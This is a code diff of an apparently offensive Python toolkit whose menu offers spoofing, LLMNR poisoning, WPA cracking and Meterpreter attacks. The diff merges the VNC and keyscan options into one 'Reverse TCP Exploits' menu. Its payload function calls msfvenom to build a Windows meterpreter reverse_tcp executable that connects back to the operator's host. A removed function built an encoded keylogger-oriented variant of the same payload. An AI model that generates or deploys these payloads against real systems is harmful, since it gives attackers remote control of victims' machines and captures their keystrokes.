@@ -470,11 +470,10 @@ def exploit_menu():
         print("1. Packet Sniffer")
         print("2. ARP Spoof")
         print("3. DNS Spoof")
-        print("4. VNC Exploit")
-        print("5. Keyscan Exploit")
-        print("6. LLMNR / NBT-NS Poisoning")
-        print("7. WPA/WPA2 Crack")
-        print("8. Exit")
+        print("4. Reverse TCP Exploits")
+        print("5. LLMNR / NBT-NS Poisoning")
+        print("6. WPA/WPA2 Crack")
+        print("7. Exit")
         menu_input = (input("Select option: "))
         if menu_input == "1":
             ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
@@ -489,22 +488,18 @@ def exploit_menu():
             print(ascii_3)
             dns_spoof()
         elif menu_input == "4":
-            ascii_4 = pyfiglet.figlet_format("VNC Exploit")
+            ascii_4 = pyfiglet.figlet_format("Reverse TCP Exploits")
             print(ascii_4)
-            vnc_menu()
+            reverse_tcp_menu()
         elif menu_input == "5":
-            ascii_5 = pyfiglet.figlet_format("Keyscan Exploit")
+            ascii_5 = pyfiglet.figlet_format("LLMNR / NBT-NS Poisoning")
             print(ascii_5)
-            keyscan_menu()
-        elif menu_input == "6":
-            ascii_6 = pyfiglet.figlet_format("LLMNR / NBT-NS Poisoning")
-            print(ascii_6)
             llmnr_nbtns_menu()
-        elif menu_input == "7":
-            ascii_7 = pyfiglet.figlet_format("WPA/WPA2 Cracking")
-            print(ascii_7)
+        elif menu_input == "6":
+            ascii_6 = pyfiglet.figlet_format("WPA/WPA2 Cracking")
+            print(ascii_6)
             wpa_menu()
-        elif menu_input == "8":
+        elif menu_input == "7":
             exploit_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
@@ -572,48 +567,33 @@ def openvas_menu():
             continue
 
 def vnc_menu():
-    vnc_loop = True
-    while vnc_loop == True:
+    reverse_tcp_loop = True
+    while reverse_tcp_loop == True:
         print("\nPlease Select an Option Below.")
-        print("1. Generate VNC Payload")
+        print("1. Generate Malicious Payload")
         print("2. Run VNC Exploit")
-        print("3. Exit")
+        print("3. Run Keyscan Exploit")
+        print("4. Exit")
         menu_input = (input("Select option: "))
         if menu_input == "1":
-            ascii_1 = pyfiglet.figlet_format("Generate VNC Payload")
+            ascii_1 = pyfiglet.figlet_format("Generate Malicious Payload")
             print(ascii_1)
-            generate_vnc_payload()
+            generate_malicious_payload()
         elif menu_input == "2":
             ascii_2 = pyfiglet.figlet_format("Run VNC Exploit")
             print(ascii_2)
             vnc_exploit()
         elif menu_input == "3":
-            vnc_loop = False
+            ascii_3 = pyfiglet.figlet_format("Run Keyscan Exploit")
+            print(ascii_2)
+            keyscan_exploit()
+        elif menu_input == "4":
+            reverse_tcp_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
             continue
 
-def keyscan_menu():
-    keyscan_loop = True
-    while keyscan_loop == True:
-        print("\nPlease Select an Option Below.")
-        print("1. Generate Keyscan Payload")
-        print("2. Run Keyscan Exploit")
-        print("3. Exit")
-        menu_input = (input("Select option: "))
-        if menu_input == "1":
-            ascii_1 = pyfiglet.figlet_format("Generate Keyscan Payload")
-            print(ascii_1)
-            generate_keyscan_payload()
-        elif menu_input == "2":
-            ascii_2 = pyfiglet.figlet_format("Run Keyscan Exploit")
-            print(ascii_2)
-            keyscan_exploit()
-        elif menu_input == "3":
-            keyscan_loop = False
-        else:
-            print("Invalid Input!\nPlease Try Again!")
-            continue
+
 
 def llmnr_nbtns_menu():
     llmnr_nbtns_loop = True
@@ -1807,10 +1787,10 @@ def arp_spoof():
 def dns_spoof():
     dns_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 dns-spoof.py; exec bash"'])
 
-def generate_vnc_payload():
+def generate_malicious_payload():
     lhost = input("IP Address of this machine: ")
     subprocess.call("msfvenom -p windows/meterpreter/reverse_tcp \
-    --platform windows -a x86 -f exe LHOST={} LPORT=444 -o Payloads/vnc_exploit.exe".format(lhost), 
+    --platform windows -a x86 -f exe LHOST={} LPORT=444 -o Payloads/malicious_payload.exe".format(lhost), 
     shell=True)
 
 def vnc_exploit():
@@ -1835,12 +1815,6 @@ def vnc_exploit():
     sleep {}; \
     sessions -i 1 -C \\"run vnc\\""'.format(exploit, payload, lhost, lport, sleep)])
 
-def generate_keyscan_payload():
-    lhost = input("IP Address of this machine: ")
-    subprocess.call('msfvenom -p windows/meterpreter/reverse_tcp \
-    --platform windows -a x86 -e x86/shikata_ga_nai -b "\\x00" LHOST={} -f exe > Payloads/keyscan_exploit.exe'.format(lhost), 
-    shell=True)
-    print("Saved as: Payloads/keyscan_exploit.exe")
 
 def keyscan_exploit():
     open('keyscan.txt', 'w')
